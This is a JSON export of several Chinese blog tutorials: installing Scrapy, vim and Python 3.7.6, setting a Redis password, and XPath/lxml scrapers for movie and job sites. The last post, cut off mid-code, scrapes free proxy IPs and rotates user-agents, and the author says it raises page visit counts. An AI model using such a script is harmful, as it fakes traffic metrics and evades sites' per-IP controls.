{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python 爬虫框架Scrapy安装汇总", "log_Intro": "Python 爬虫框架Scrapy安装汇总", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"传统方式安装scrapy慎用\">传统方式安装Scrapy(慎用)</h2>\n\n<p>练习了基本的操作之后，当然就要找框架来进行爬虫实验啊。于是就在网上找Windows 64安装Scrapy的方法，查到的都是非常繁琐的安装方式，由于Scrapy有很多个依赖，所以在安装Scrapy之前你就要先安装他的所有的依赖啊，下面列举出部分依赖库：</p>\n\n<p>lxml模块 cryptography模块 pywin32模块 Twisted模块 pyOpenSSL模块等等，大家想想啊，Python怎么会那么顺利的让我们安装完这里模块呢？答案是一定的。有些人会说，我就不信我直接一个命令pip install Scrapy看看能不能直接安装上，敲完命令直接之歌回车键，看见命令行工具上显示的安装过程还笑出声来，终于可以进行爬虫了，没想到最后出现了一个错误failed with error code 1 in C:****************\\Temp\\pip-build-5f9_epll\\Twisted\\，于是乎就查到原来没有Twisted这个依赖的模块，想着pip install Twisted最后命令行工具上还是继续报错，安装失败啊(pip install Twisted[windows_platform]这个命令也试过，没有什么用的)。</p>\n\n<h3 id=\"安装twisted模块\"><a name=\"t1\"></a><a></a>安装Twisted模块</h3>\n\n<p>在这里告诉大家一个方法安装Twisted模块的方法啊，首先需要先安装wheel模块，这回使用pip install wheel不会报错的，直接安装成功啦。之后打开命令行工具输入Python进入Python环境(也就是输入Python命令)，看到我的Python版本是3.6.1的，去</p>\n\n<p><a href=\"https://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted\" rel=\"nofollow\">https://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted</a>这个地址下载对应版本的Twisted，</p>\n\n<p><strong><a href=\"http://twistedmatrix.com/trac/\" rel=\"nofollow\">Twisted</a></strong>, an event-driven networking engine.</p>\n\n<ul><li><a>Twisted‑19.10.0‑cp38‑cp38‑win_amd64.whl</a></li>\n\t<li><a>Twisted‑19.10.0‑cp38‑cp38‑win32.whl</a></li>\n\t<li><a>Twisted‑19.10.0‑cp37‑cp37m‑win_amd64.whl</a></li>\n\t<li><a>Twisted‑19.10.0‑cp37‑cp37m‑win32.whl</a></li>\n\t<li><a>Twisted‑19.10.0‑cp36‑cp36m‑win_amd64.whl</a></li>\n\t<li><a>Twisted‑19.10.0‑cp36‑cp36m‑win32.whl</a></li>\n\t<li><a>Twisted‑19.10.0‑cp35‑cp35m‑win_amd64.whl</a></li>\n\t<li><a>Twisted‑19.10.0‑cp35‑cp35m‑win32.whl</a></li>\n\t<li><a>Twisted‑19.10.0‑cp27‑cp27m‑win_amd64.whl</a></li>\n\t<li><a>Twisted‑19.10.0‑cp27‑cp27m‑win32.whl</a></li>\n\t<li><a>Twisted‑18.9.0‑cp34‑cp34m‑win_amd64.whl</a></li>\n\t<li><a>Twisted‑18.9.0‑cp34‑cp34m‑win32.whl</a></li>\n</ul><p>cp后面跟的数字是python的版本，比如现在我的python版本是3.5，那么需要下载cp35；</p>\n\n<p>根据下面图片中的Python是win32还是arm64选择Twisted的版本，针对我的Python版本我下载了倒数第二个whl文件，之后进行安装pip install Twisted‑17.9.0‑cp36‑cp36m‑win32.whl(注意这里是文件全名)，这时出现一个[filename.whl is not supported wheel on this platform]的错误，这时有人会说，楼主，你骗我。。。我这辈子都不会原谅你的。。。客官别急，遇到这种情况你就把win32和win64的版本都下下来分别安装试一下，我的系统是64位装arm64位的whl能成功</p>\n\n<p>好了大功告成了，可以安装Scrapy了，如果出现缺少模块。那你就直接pip install <em>*</em>进行安装吧，最难搞定的Twisted都搞定了还怕什么呢？</p>\n\n<h2 id=\"非常爽的安装scrapy方式\"><a name=\"t2\"></a><a></a>非常爽的安装Scrapy方式</h2>\n\n<p>首先去<a href=\"https://www.anaconda.com/download/\" rel=\"nofollow\">https://www.anaconda.com/download/</a>这个网站下载一个Anaconda客户端，并进行安装(网上有好多安装教程的)，之后在命令行输入conda install scrapy命令就下载安装了Scrapy模块，就是这么简单，如果你使用conda install scrapy这个命令时出现Proceed ([y]/n)? 直接输入一个y点击回车就好了，就会在命令行工具上看见安装需要安装的模块，安装完直接输入Scrapy检验是否安装成功，如果出现pkg_resources.DistributionNotFound: The ‘pyasn1-modules’ distribution was not found and is required by service-identity类似的情况，那就使用pip install pyasn1-modules进行安装就行了。安装成功会像下面一样的：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"167\" src=\"https://img-blog.csdnimg.cn/20200121004008325.png\" width=\"380\"></p>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891276, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Centos7 下安装VIM编辑器", "log_Intro": "Centos7 下安装VIM编辑器", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>我们在安装完Centos后，它默认的是安装了VI编辑器，VIM是没有安装的，所以我们在使用vim test.txt时会提示： vim command not found 。。。 这就是说明我们的Linux环境没有安装vim编辑器，下面我们来说一下如何安装这个编辑器：</p>\n\n<p><strong>vim编辑器需要安装三个包：</strong></p>\n\n<blockquote>\n<p>vim-X11-7.4.629-6.el7.x86_64<br>\nvim-common-7.4.629-6.el7.x86_64<br>\nvim-enhanced-7.4.629-6.el7.x86_64<br>\nvim-minimal-7.4.629-6.el7.x86_64<br>\nvim-filesystem-7.4.629-6.el7.x86_64</p>\n</blockquote>\n\n<p>1. 查看一下你本机已经存在的包，确认一下你的VIM是否已经安装：   输入 </p>\n\n<pre class=\"has\">\n<code>rpm -qa|grep vim</code></pre>\n\n<p>这个命令，如何vim已经正确安装，则会显示上面三个包的名称2. 如果缺少了其中某个，比如说： vim-enhanced这个包少了，执行：</p>\n\n<pre class=\"has\">\n<code>yum -y install vim-enhanced</code></pre>\n\n<p>它会自动下载安装。3. 如果上面三个包一个都没有显示，则直接输入命令：   </p>\n\n<pre class=\"has\">\n<code>yum -y install vim*</code></pre>\n\n<p>可自动安装，完毕后，即可使用vim编辑器。</p>\n\n<p><code class=\"language-html hljs\"><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20200127211302166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></code></p>\n                                    </div>", "log_PostTime": 1584891276, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "CentOs7中安装python3.7.6", "log_Intro": "CentOs7中安装python3.7.6", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3> </h3>\n\n<h3 id=\"安装相应的编译工具\">1.安装相应的编译工具</h3>\n\n<p>在root用户下(不要用普通用户,麻烦),全部复制粘贴过去,一次性安装即可.</p>\n\n<pre class=\"has\">\n<code>yum -y groupinstall \"Development tools\"\nyum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel\nyum install -y libffi-devel zlib1g-dev\nyum install zlib* -y</code></pre>\n\n<h3 id=\"下载安装包\">2.下载安装包</h3>\n\n<pre class=\"has\">\n<code>wget  https://www.python.org/ftp/python/3.7.6/Python-3.7.6.tar.xz</code></pre>\n\n<h3 id=\"解压\">3.解压</h3>\n\n<pre class=\"has\">\n<code>tar -xvJf  Python-3.7.6.tar.xz</code></pre>\n\n<h3 id=\"创建编译安装目录\">4.创建编译安装目录</h3>\n\n<pre class=\"has\">\n<code>mkdir /usr/local/python3 </code></pre>\n\n<h3 id=\"安装\">5.安装</h3>\n\n<pre class=\"has\">\n<code>cd Python-3.7.6\n./configure --prefix=/usr/local/python3 --enable-optimizations --with-ssl \n#第一个指定安装的路径,不指定的话,安装过程中可能软件所需要的文件复制到其他不同目录,删除软件很不方便,复制软件也不方便.\n#第二个可以提高python10%-20%代码运行速度.\n#第三个是为了安装pip需要用到ssl,后面报错会有提到.\nmake &amp;&amp; make install</code></pre>\n\n<p><strong>configure: WARNING: unrecognized options: --with-ssl</strong></p>\n\n<p><strong>出了个警告：不可识别的--with-ssl选项。</strong></p>\n\n<p><strong>解决:</strong></p>\n\n<pre class=\"has\">\n<code>yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel \nmake clean\nmake</code></pre>\n\n<p> </p>\n\n<h3 id=\"创建软链接\">6.创建软链接</h3>\n\n<pre class=\"has\">\n<code>ln -s /usr/local/python3/bin/python3 /usr/local/bin/python3\nln -s /usr/local/python3/bin/pip3 /usr/local/bin/pip3</code></pre>\n\n<h3 id=\"验证是否成功\">7.验证是否成功</h3>\n\n<pre class=\"has\">\n<code>python3 -V\npip3 -V</code></pre>\n\n<h3 id=\"报错处理\">8.报错处理</h3>\n\n<p>错误1.</p>\n\n<pre class=\"has\">\n<code>zipimport.ZipImportError: can't decompress data; zlib not available Makefile:1099: recipe for target 'install' failed make: *** [install] Error 1</code></pre>\n\n<p>需要安装依赖</p>\n\n<pre class=\"has\">\n<code>yum -y install zlib1g-dev</code></pre>\n\n<p>错误2.</p>\n\n<pre class=\"has\">\n<code>ModuleNotFoundError: No module named '_ctypes'</code></pre>\n\n<p>需要安装依赖</p>\n\n<pre class=\"has\">\n<code>yum -y install libffi-devel </code></pre>\n\n<p>这两个错误需要的依赖已经添加到一开始的依赖安装上去了<br>\n </p>\n\n<h3 id=\"安装pipenv\">9.安装pipenv</h3>\n\n<p>在centos中使用python3.7或以上版本,进行pip install 命令容易报错</p>\n\n<pre class=\"has\">\n<code>pip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.\nCould not fetch URL https:*******: There was a problem confirming the ssl certificate: \nCan't connect to HTTPS URL because the SSL module is not available. - skipping</code></pre>\n\n<h3 id=\"在.configure过程中如果没有加上with-ssl参数时默认安装的软件涉及到ssl的功能不可用刚好pip3过程需要ssl模块而由于没有指定所以该功能不可用解决办法是重新对python3.6进行编译安装用一下过程来实现编译安装\">在./configure过程中，如果没有加上–with-ssl参数时，默认安装的软件涉及到ssl的功能不可用，刚好pip3过程需要ssl模块，而由于没有指定，所以该功能不可用。解决办法是重新对python3.6进行编译安装，用一下过程来实现编译安装:</h3>\n\n<pre class=\"has\">\n<code>cd Python-3.7.6\n./configure --with-ssl\nmake &amp;&amp; make install</code></pre>\n\n<p>即可正常使用pip安装.<br>\n这个也在安装python的时候指定了.<br>\n </p>\n\n<h3 id=\"修改pip安装源\">10.修改pip安装源</h3>\n\n<p>修改系统pip安装源<br>\n在家目录下新建<code>.pip</code>文件夹,进入文件夹新建文件<code>pip.conf</code>之后写入相应镜像网站地址</p>\n\n<pre class=\"has\">\n<code>cd ~\nmkdir .pip\ncd .pip\nvim pip.conf\n\n#进入后添加以下内容,保存退出.\n[global]\nindex-url = https://mirrors.aliyun.com/pypi/simple</code></pre>\n\n<p>修改pipenv安装源<br>\n在自己的虚拟环境中找到<code>Pipfile</code>文件,将其中的<code>url = \"https://pypi.org/simple\"</code>修改为你需要的国内镜像,如<code>https://mirrors.aliyun.com/pypi/simple/</code></p>\n\n<pre class=\"has\">\n<code>[root@localhost myproject]# vim Pipfile \n\n\n[[source]]\nname = \"pypi\"\nurl = \"https://pypi.org/simple\" # 改为url = \"https://mirrors.aliyun.com/pypi/simple/\"\nverify_ssl = true\n\n[dev-packages] #这里是开发环境专属包,使用pipenv install --dev package来安装专属开发环境的包\n\n[packages] # 全部环境的通用包,安装在这里.\n\n[requires]\npython_version = \"3.7\"</code></pre>\n                                    </div>", "log_PostTime": 1584891277, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Redis使用认证密码登录", "log_Intro": "Redis使用认证密码登录", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>Redis默认配置是不需要密码认证的，也就是说只要连接的Redis服务器的host和port正确，就可以连接使用。<br>\n这在安全性上会有一定的问题，所以需要<strong><em>启用Redis的密码认证功能，增加Redis服务器的安全性</em></strong>。</p>\n\n<p> </p>\n\n<p>1. 修改配置文件</p>\n\n<p>Redis的配置文件默认在/etc/redis.conf，找到如下行：</p>\n\n<p> </p>\n\n<pre>\n<code>#requirepass foobared\n</code></pre>\n\n<p>去掉前面的注释，并修改为所需要的密码：</p>\n\n<p> </p>\n\n<pre>\n<code>requirepass myPassword （其中myPassword就是要设置的密码）\n</code></pre>\n\n<p> </p>\n\n<p>2. 重启Redis</p>\n\n<p>如果Redis已经配置为service服务，可以通过以下方式重启：</p>\n\n<p> </p>\n\n<pre>\n<code>service redis restart\n</code></pre>\n\n<p>如果Redis没有配置为service服务，可以通过以下方式重启：</p>\n\n<p> </p>\n\n<pre>\n<code>/usr/local/bin/redis-cli shutdown\n/usr/local/bin/redis-server /etc/redis.conf\n</code></pre>\n\n<p> </p>\n\n<p>3. 登录验证</p>\n\n<p>设置Redis认证密码后，客户端登录时需要使用-a参数输入认证密码，不添加该参数虽然也可以登录成功，但是没有任何操作权限。如下：</p>\n\n<p> </p>\n\n<pre>\n<code>$ ./redis-cli -h 127.0.0.1 -p 6379\n127.0.0.1:6379&gt; keys *\n(error) NOAUTH Authentication required.\n</code></pre>\n\n<p>使用密码认证登录，并验证操作权限：</p>\n\n<p> </p>\n\n<pre>\n<code>$ ./redis-cli -h 127.0.0.1 -p 6379 -a myPassword\n127.0.0.1:6379&gt; config get requirepass\n1) \"requirepass\"\n2) \"myPassword\"\n</code></pre>\n\n<p>看到类似上面的输出，说明Reids密码认证配置成功。</p>\n\n<p>除了按上面的方式在登录时，使用-a参数输入登录密码外。也可以不指定，在连接后进行验证：</p>\n\n<p> </p>\n\n<pre>\n<code>$ ./redis-cli -h 127.0.0.1 -p 6379\n127.0.0.1:6379&gt; auth myPassword\nOK\n127.0.0.1:6379&gt; config get requirepass\n1) \"requirepass\"\n2) \"myPassword\"\n127.0.0.1:6379&gt; \n</code></pre>\n\n<p> </p>\n\n<p>4. 在命令行客户端配置密码（redis重启前有效）</p>\n\n<p>前面介绍了通过redis.conf配置密码，这种配置方式需要重新启动Redis。<br>\n也可以通命令行客户端配置密码，这种配置方式不用重新启动Redis。配置方式如下：</p>\n\n<p> </p>\n\n<pre>\n<code>127.0.0.1:6379&gt; config set requirepass newPassword\nOK\n127.0.0.1:6379&gt; config get requirepass\n1) \"requirepass\"\n2) \"newPassword\"\n</code></pre>\n\n<p>注意：使用命令行客户端配置密码，重启Redis后仍然会使用�redis.conf配置文件中的密码。</p>\n\n<p> </p>\n\n<p>5. 在Redis集群中使用认证密码</p>\n\n<p>如果Redis服务器，使用了集群。除了在master中配置密码外，也需要在slave中进行相应配置。在slave的配置文件中找到如下行，去掉注释并修改与master相同的密码即可：</p>\n\n<p> </p>\n\n<pre>\n<code># masterauth master-password</code></pre>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891278, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python的Xpath介绍和语法详解", "log_Intro": "Python的Xpath介绍和语法详解", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2>1.简介</h2>\n\n<p>XPath是一门在XML和HTML文档中查找信息的语言，可以用来在XML和HTML文档中对元素和属性进行遍历</p>\n\n<p>XPath的安装</p>\n\n<p>Chrome插件XPath Helper</p>\n\n<p>点Chrome浏览器右上角：更多工具-----扩展程序-----谷歌商店--------勾选XPath Helper（需要翻墙）</p>\n\n<p> </p>\n\n<h2>2.语法详解</h2>\n\n<p> </p>\n\n<pre>\n<code>#1.选取节点\n'''\n/   如果是在最前面，代表从根节点选取，否则选择某节点下的某个节点.只查询子一辈的节点\n    /html   查询到一个结果\n    /div    查询到0个结果，因为根节点以下只有一个html子节点\n    /html/body  查询到1个结果\n\n//  查询所有子孙节点\n    //head/script\n    //div\n\n.   选取当前节点\n\n..  选取当前节点的父节点\n\n@   选取属性\n    //div[@id]  选择所有带有id属性的div元素\n    &lt;div id=\"sidebar\" class=\"sidebar\" data-lg-tj-track-code=\"index_navigation\" data-lg-tj-track-type=\"1\"&gt;\n\n'''\n#2.谓语\n'''\n谓语是用来查找某个特定的节点或者包含某个指定的值的节点，被嵌在方括号中。\n//body/div[1]                body下的第一个div元素\n//body/div[last()]           body下的最后一个div元素\n//body/div[position()&lt;3]     body下的位置小于3的元素\n//div[@id]                   div下带id属性的元素\n&lt;div id=\"sidebar\" class=\"sidebar\" data-lg-tj-track-code=\"index_navigation\" data-lg-tj-track-type=\"1\"&gt;\n//input[@id=\"serverTime\"]    input下id=\"serverTime\"的元素\n\n模糊匹配\n//div[contains(@class,'f1')] div的class属性带有f1的\n通配符 *\n//body/*                    body下面所有的元素\n//div[@*]                   只要有用属性的div元素\n//div[@id='footer']    //div  带有id='footer'属性的div下的所有div元素\n//div[@class='job_bt'] //dd[@class='job-advantage']\n\n运算符\n//div[@class='job_detail'] and @id='job_tent'\n//book/title | //book/price         选取 book 元素的所有 title 和 price 元素。\n也可以百度搜索XPath语法\n\n.//a/text()         当前标签下所有a标签的文字内容\n//tr[position()&gt;1 and position()&lt;11] 位置大于1小于11\n'''\n\n#需要注意的知识点\n'''\n1./和//的区别：/代表子节点，//代表子孙节点，//用的比较多\n2.contains有时候某个属性中包含了多个值，那么使用contains函数\n//div[contains(@class,'lg')]\n3.谓语中的下标是从1开始的，不是从0开始的\n'''</code></pre>\n\n<p> </p>\n\n<p> </p>\n\n<h2>3.要在python中使用xpath，要导入一个库 lxml。</h2>\n\n<p>这个是C编写的库，直接pip3 install lxml可能会有一些显示问题，但是不影响使用。</p>\n\n<p>然而程序员特有的代码洁癖让我看见波浪线也不会爽，所以去https://www.lfd.uci.edu/~gohlke/pythonlibs/下载lxml的whl文件进行pip（根据自己的pycharm版本选择）</p>\n\n<p> </p>\n\n<h2>4.lxml和xpath的结合使用</h2>\n\n<p> </p>\n\n<pre>\n<code>#  -*-coding:utf8 -*-\nfrom lxml import etree\n#1.获取所有tr标签\n#2.获取第2个tr标签\n#3.获取所有class等于even的标签\n#4.获取所有a标签的href属性\n#5.获取所有的职位信息(纯文本)\n\n\n\nparser=etree.HTMLParser(encoding='utf-8')\nhtml=etree.parse('tencent.html',parser=parser)\n\n#1.获取所有tr标签\n#xpath函数返回的是一个列表\n# trs=html.xpath('//tr')\n# print(trs)\n# for tr in trs:\n#     print(etree.tostring(tr,encoding='utf-8').decode('utf-8'))\n\n#2.获取第2个tr标签\n\n# trs=html.xpath('//tr[2]')[0]\n#这样直接找第2个tr标签，实际上会把所有的table下的第二个tr标签找出来，\n#为了更精准，可以先把table标签找到，再找这个table下的第二个tr标签\n# trs=html.xpath('//table[@class=\"tablelist\"]//tr[1]')[0]\n# print(etree.tostring(trs,encoding='utf-8').decode('utf-8'))\n\n#3.获取所有class等于even的标签\n# trs=html.xpath(\"//tr[@class='even']\")\n# for tr in trs:\n#     print(etree.tostring(tr, encoding='utf-8').decode('utf-8'))\n\n#4.获取所有a标签的href属性\n# a_list=html.xpath('//a/@href')\n# for a in a_list:\n#     print(a)\n\n#5.获取所有的职位信息(纯文本)\ntrs=html.xpath('//tr[position()&gt;1 and position()&lt;11]')\npositions=[]\nfor tr in trs:\n    #写了//后，则一定会从整个文档找a标签，会无视前面的tr\n    # href=tr.xpath('//a')\n    #写了.后，则获取当前标签下的a标签\n    href=tr.xpath('.//a/@href')[0]\n    fullurl='http://hr.tencent.com/'+href\n    #title文本信息不是td[1]的直接子元素标签，所以要加./td[1]//text()\n    title=tr.xpath('./td[1]//text()')[0]\n    category=tr.xpath('./td[2]/text()')[0]\n    nums=tr.xpath('./td[3]/text()')[0]\n    address=tr.xpath('./td[4]/text()')[0]\n    pubtime=tr.xpath('./td[5]/text()')[0]\n    position={\n        'url':fullurl,\n        'title':title,\n        'category':category,\n        'nums':nums,\n        'pubtime':pubtime\n    }\n    positions.append(position)\n# print(positions)\n\n#6.获取纯文本信息还可以用string\n# print(html.xpath(\"string(//tr[1])\"))\n# trs=html.xpath('//tr')\n# for tr in trs:\n    # print(tr.xpath(\"string(.)\").strip()</code></pre>\n\n<p> </p>\n\n<p> </p>\n\n<h2>5.实战案例，豆瓣电影爬虫</h2>\n\n<p> </p>\n\n<pre>\n<code>#  -*-coding:utf8 -*-\n#1.将目标网站上的页面抓取下来\n#2.将抓取下来的数据根据一定的规则进行提取\n\nimport requests\nfrom lxml import etree\n#1.将目标网站上的页面抓取下来\nheaders={\n    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',\n    'Referer':'https://www.douban.com/',\n}\nurl='https://movie.douban.com/'\nresponse=requests.get(url,headers=headers)\ntext=response.text\nhtml=etree.HTML(text)\nul=html.xpath(\"//ul[@class='ui-slide-content']\")[0]\n# print(etree.tostring(ul,encoding='utf-8').decode('utf-8'))\nlis=ul.xpath('./li[@data-title]')\nmovies=[]\nfor li in lis:\n    title=li.xpath('@data-title')[0]\n    score=li.xpath('@data-rate')[0]\n    duration=li.xpath('@data-duration')[0]\n    region=li.xpath('@data-region')[0]\n    director=li.xpath('@data-director')[0]\n    actors=li.xpath('@data-actors')[0]\n    thumbnail=li.xpath('.//img/@src')[0]\n    movie={\n        'title':title,\n        'score':score,\n        'duration':duration,\n        'region':region,\n        'director':director,\n        'actors':actors,\n        'thumbnail':thumbnail\n    }\n    movies.append(movie)\nprint(movies)</code></pre>\n\n<p> </p>\n\n<p> </p>\n\n<h2>6.实战案例，电影天堂爬虫</h2>\n\n<p> </p>\n\n<pre>\n<code>#  -*-coding:utf8 -*-\nimport requests\nfrom lxml import etree\n\n# url='https://www.dytt8.net/html/gndy/dyzz/list_23_1.html'\nheaders = {\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36'\n}\n# response=requests.get(url,headers=headers)\n# 在电影天堂的网页中，因为编码方式，requests库猜错了，所以response.text出现乱码\n# print(response.text)\n# text=response.content.decode('gbk')\nBaseDomain = 'https://www.dytt8.net'\n\n\ndef get_detail_url(url):\n    response = requests.get(url, headers=headers)\n    # print(response.encoding)\n    # 默认解码方式ISO-8859-1\n    # text=response.content.decode('gbk')\n    # 在使用gbk解码时遇到了一些问题，第五页里有特殊字符，无法解析\n    # 估计是因为xpath默认解码方式和gbk不一致导致的，这时可以直接传requests.text\n    # 因为要获取的是英文字符，不指定解码方式也能得到\n    html = etree.HTML(response.text)\n    detail_urls = html.xpath('//table[@class=\"tbspan\"]//a/@href')\n    detail_urls = list(map(lambda url: BaseDomain + url, detail_urls))\n    return detail_urls\n\n\ndef parse_detail_page(url):\n    response = requests.get(url, headers=headers)\n    text = response.content.decode('gbk')\n    html = etree.HTML(text)\n    title = html.xpath(\"//font[@color='#07519a' and position()=1]/text()\")\n    zoomE = html.xpath(\"//div[@id='Zoom']\")[0]\n    imgs = zoomE.xpath(\".//img/@src\")\n    cover = imgs[0]\n    screenshot = imgs[1]\n    infos = zoomE.xpath(\".//text()\")\n    movie = {\n        'title': title,\n        'cover': cover,\n        'screenshot': screenshot\n    }\n\n    def parse_info(info, rule):\n        return info.replace(rule, '').strip()\n\n    for index, info in enumerate(infos):\n        if info.startswith('◎年　　代'):\n            info = parse_info(info, '◎年　　代')\n            movie['year'] = info\n        elif info.startswith('◎产　　地'):\n            info = parse_info(info, '◎产　　地')\n            movie['country'] = info\n        elif info.startswith('◎类　　别'):\n            info = parse_info(info, '◎类　　别')\n            movie['category'] = info\n        elif info.startswith('◎豆瓣评分'):\n            info = parse_info(info, '◎豆瓣评分')\n            movie['douban_rating'] = info\n        elif info.startswith('◎片　　长'):\n            info = parse_info(info, '◎片　　长')\n            movie['duration'] = info\n        elif info.startswith('◎导　　演'):\n            info = parse_info(info, '◎导　　演')\n            movie['director'] = info\n        elif info.startswith('◎主　　演'):\n            info = parse_info(info, '◎主　　演')\n            actors = []\n            actors.append(info)\n            for x in range(index + 1, len(infos)):\n                actor = infos[x].strip()\n                if actor.startswith('◎简　　介'):\n                    break\n                actors.append(actor)\n            movie['actors'] = actors\n        elif info.startswith('◎简　　介 '):\n            info=''\n            for x in range(index+1,len(infos)):\n                if infos[x].startswith('【下载地址】'):\n                    break\n                info = info + infos[x].strip()\n            movie['profile']=info\n    download_url = html.xpath(\"//td[@bgcolor='#fdfddf']//a/@href\")[0]\n    movie['download_url']=download_url\n    return movie\n\ndef spider():\n    # url = ['https://www.dytt8.net/html/gndy/dyzz/list_23_%s.html' % i for i in range(1, 8)]\n    base_url = 'https://www.dytt8.net/html/gndy/dyzz/list_23_{}.html'\n    movies=[]\n    for x in range(1, 8):\n        url = base_url.format(x)\n        detail_urls = get_detail_url(url)\n        for detail_url in detail_urls:\n            movie = parse_detail_page(detail_url)\n            movies.append(movie)\n            print(movies)\nif __name__ == '__main__':\n    spider()</code></pre>\n\n<p> </p>\n\n<p> </p>\n\n<h2>7.实战案例，腾讯招聘爬虫</h2>\n\n<p> </p>\n\n<pre>\n<code>#  -*-coding:utf8 -*-\nimport requests\nfrom lxml import etree\n\nbase_url = 'https://hr.tencent.com/position.php?tid=87&amp;start={}0#a'\nbase_domain = 'https://hr.tencent.com/'\nheaders = {\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36'\n}\npositions=[]\n\ndef parse_url(url):\n    detail_urls=[]\n    response=requests.get(url,headers=headers)\n    html=etree.HTML(response.text)\n    trs=html.xpath(\"//table[@class='tablelist']//tr[position()&gt;1 and position()&lt;12]\")\n    for tr in trs:\n        href=tr.xpath('.//a/@href')[0]\n        url=base_domain+href\n        detail_urls.append(url)\n    return detail_urls\n\n\ndef parse_detail_page(url):\n    response=requests.get(url,headers=headers)\n    html=etree.HTML(response.text)\n    zoomE=html.xpath('//table[@class=\"tablelist textl\"]')[0]\n    title=zoomE.xpath('.//tr[1]/td/text()')[0]\n    city=zoomE.xpath('.//tr[2]/td[1]/text()')[0]\n    category=zoomE.xpath('.//tr[2]/td[2]/text()')[0]\n    nums=zoomE.xpath('.//tr[2]/td[3]/text()')[0]\n    duty=zoomE.xpath('.//tr[3]//ul//text()')\n    dutys=''\n    for i in duty:\n        dutys=dutys+i.strip()\n    require=zoomE.xpath('.//tr[4]//ul//text()')\n    requires=''\n    for i in require:\n        requires=requires+i.strip()\n    position={\n        'title':title,\n        'city':city,\n        'category':category,\n        'nums':nums,\n        'dutys':dutys,\n        'requires':requires\n    }\n    return position\n\nif __name__ == '__main__':\n    for i in range(1,10):\n        url=base_url.format(i)\n        detail_urls=parse_url(url)\n        for detail_url in detail_urls:\n            position=parse_detail_page(detail_url)\n            positions.append(position)\n            print(position)</code></pre>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891280, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python 代理爬取网站数据", "log_Intro": "Python 代理爬取网站数据", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>代理IP通过<a href=\"https://www.kuaidaili.com/free/\" rel=\"nofollow\">https://www.kuaidaili.com/free/</a> 获取，我使用的的是http 协议的代理。根据自己需求选择http或者https 协议的页面。</p>\n\n<p>访问量会有增长，但效果不是非常理想，后面找时间在研究下、废话不多说，直接上代码。</p>\n\n<pre>\n<code class=\"language-python\"># -*- coding:utf-8 -*-\n\nimport requests\n\nimport random\n\nimport time\n\nimport re\n\nuser_agent_list=[\n    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',\n    'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50',\n    'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50',\n    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)',\n    'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',\n    'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11',\n    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',\n    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)',\n    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0',\n    'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',\n]\n\ncount=0\n\ndef Get_proxy_ip():\n    headers = {\n    'Host': \"www.kuaidaili.com\",\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',\n    'Accept': r'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'\n    }\n    req=requests.get(r'https://www.kuaidaili.com/free/inha/16/',headers=headers)\n    html=req.text\n    proxy_list=[]\n    IP_list=re.findall(r'\\d+\\.\\d+\\.\\d+\\.\\d+',html)\n    port_lits=re.findall(r'&lt;td data-title=\"PORT\"&gt;\\d+&lt;/td&gt;',html)\n\n    for i in range(len(IP_list)):\n        ip=IP_list[i]\n        